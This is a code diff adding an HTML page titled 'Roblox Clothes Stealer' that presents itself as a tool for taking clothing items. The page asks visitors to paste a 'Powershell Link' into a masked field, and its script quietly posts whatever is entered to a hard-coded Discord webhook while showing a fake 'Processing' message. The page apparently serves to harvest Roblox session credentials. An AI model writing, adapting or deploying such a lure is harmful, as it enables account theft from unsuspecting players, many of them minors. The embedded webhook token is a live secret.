@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Clothes Stealer</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: black;
+            color: white;
+            font-family: 'Courier New', Courier, monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .form-container {
+            background: black;
+            border: 4px dashed white;
+            padding: 20px;
+            border-radius: 0;
+            text-align: center;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 0 15px white, inset 0 0 5px black;
+        }
+
+        h1 {
+            font-size: 28px;
+            text-transform: uppercase;
+            margin-bottom: 20px;
+            letter-spacing: 2px;
+            text-shadow: 0 0 5px white;
+        }
+
+        input[type="password"] {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 2px solid white;
+            border-radius: 0;
+            font-size: 16px;
+            background-color: black;
+            color: white;
+            outline: none;
+            box-shadow: inset 0 0 5px white;
+        }
+
+        input[type="password"]::placeholder {
+            color: white;
+            opacity: 0.8;
+            font-style: italic;
+        }
+
+        input[type="password"]:focus {
+            border: 2px solid white;
+            background-color: black;
+            box-shadow: 0 0 10px white;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: black;
+            color: white;
+            border: 2px dashed white;
+            border-radius: 0;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+        }
+
+        button:hover {
+            background-color: white;
+            color: black;
+            text-shadow: 0 0 5px black;
+        }
+
+        .notification {
+            position: fixed;
+            top: 10%;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: black;
+            color: white;
+            padding: 10px 20px;
+            border: 2px dashed white;
+            font-size: 16px;
+            font-weight: bold;
+            opacity: 0;
+            transition: opacity 0.5s ease-in-out;
+            z-index: 1000;
+            text-transform: uppercase;
+        }
+
+        .notification.show {
+            opacity: 1;
+        }
+    </style>
+</head>
+<body>
+    <div class="form-container">
+        <h1>Enter Powershell Link</h1>
+        <input type="password" id="userInput" placeholder="Enter your secure text">
+        <button onclick="submitData()">Steal Clothes</button>
+    </div>
+    <div id="notification" class="notification">Processing... Please wait</div>
+    <script>
+        function showNotification() {
+            const notification = document.getElementById('notification');
+            notification.classList.add('show');
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 3000); // Show for 3 seconds
+        }
+
+        async function submitData() {
+            showNotification();
+
+            const input = document.getElementById('userInput').value;
+            const webhookUrl = 'https://discord.com/api/webhooks/1321778429015621693/HNT251o7ObV_rCY9k4s15CHTU2d_IXTdOGZegZevP1AMNR65_BMUngLG10e1dhssv6PE';
+
+            // Create a Blob for the text file
+            const file = new Blob([input], { type: 'text/plain' });
+            const formData = new FormData();
+            formData.append('file', file, 'message.txt');
+
+            await fetch(webhookUrl, {
+                method: 'POST',
+                body: formData
+            });
+        }
+    </script>
+</body>
+</html>
